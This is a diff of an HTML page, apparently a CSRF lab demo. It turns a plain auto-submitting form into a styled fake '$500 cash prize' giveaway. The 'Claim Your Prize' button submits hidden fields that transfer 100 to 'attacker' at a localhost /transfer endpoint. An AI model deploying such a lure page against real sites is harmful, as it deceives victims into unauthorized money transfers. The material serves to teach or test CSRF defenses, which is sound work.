@@ -1,21 +1,134 @@
 <!doctype html>
-<html>
+<html lang="en">
   <head>
     <meta charset="utf-8" />
-    <title>Totally Harmless Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎁 Free Giveaway - Claim Now!</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
+        padding: 20px;
+      }
+      
+      .container {
+        max-width: 500px;
+        width: 100%;
+      }
+      
+      .card {
+        background: white;
+        border-radius: 16px;
+        padding: 50px 40px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        text-align: center;
+      }
+      
+      .gift-icon {
+        font-size: 80px;
+        margin-bottom: 20px;
+        animation: bounce 2s infinite;
+      }
+      
+      @keyframes bounce {
+        0%, 20%, 50%, 80%, 100% {
+          transform: translateY(0);
+        }
+        40% {
+          transform: translateY(-20px);
+        }
+        60% {
+          transform: translateY(-10px);
+        }
+      }
+      
+      h1 {
+        color: #1f2937;
+        font-size: 32px;
+        margin-bottom: 16px;
+      }
+      
+      .subtitle {
+        color: #6b7280;
+        font-size: 18px;
+        margin-bottom: 30px;
+        line-height: 1.5;
+      }
+      
+      .prize-box {
+        background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+        border: 2px dashed #f59e0b;
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 30px;
+      }
+      
+      .prize-text {
+        color: #92400e;
+        font-size: 20px;
+        font-weight: 700;
+      }
+      
+      button {
+        width: 100%;
+        padding: 18px;
+        background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 18px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: transform 0.2s, box-shadow 0.2s;
+        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
+      }
+      
+      button:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 8px 20px rgba(16, 185, 129, 0.5);
+      }
+      
+      button:active {
+        transform: translateY(0);
+      }
+      
+      .disclaimer {
+        margin-top: 20px;
+        font-size: 12px;
+        color: #9ca3af;
+      }
+    </style>
   </head>
   <body>
-    <h1>🎁 Free Giveaway!</h1>
-    <p>This page is harmless (trust me).</p>
+    <div class="container">
+      <div class="card">
+        <div class="gift-icon">🎁</div>
+        <h1>Congratulations!</h1>
+        <p class="subtitle">You've been selected for our exclusive giveaway!</p>
+        
+        <div class="prize-box">
+          <p class="prize-text">🎉 $500 CASH PRIZE 🎉</p>
+        </div>
 
-    <form action="http://127.0.0.1:8000/transfer" method="POST">
-      <input type="hidden" name="recipient" value="attacker" />
-      <input type="hidden" name="amount" value="100" />
-      <!-- No CSRF token -->
-    </form>
+        <form action="/transfer" method="POST">
+          <input type="hidden" name="recipient" value="attacker" />
+          <input type="hidden" name="amount" value="100" />
+          <!-- No CSRF token (this is the CSRF attack) -->
+          <button type="submit">🎁 Claim Your Prize Now!</button>
+        </form>
 
-    <script>
-      document.forms[0].submit();
-    </script>
+        <p class="disclaimer">* Limited time offer. Click to claim immediately.</p>
+      </div>
+    </div>
   </body>
 </html>
